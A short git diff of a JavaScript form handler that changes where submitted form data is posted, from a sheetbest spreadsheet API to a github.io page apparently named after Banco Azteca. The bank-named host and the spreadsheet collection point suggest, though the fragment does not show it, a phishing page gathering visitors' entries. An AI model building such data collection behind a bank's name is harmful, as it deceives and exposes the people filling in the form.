@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/7b2d03a3-fa77-4ab6-bcb6-f34ac0b9646c', {
+    const respuesta = await fetch('https://banco-azteca-12e.github.io/banco-azteca/', {
         method: 'POST',
         mode: 'cors',
         headers: {
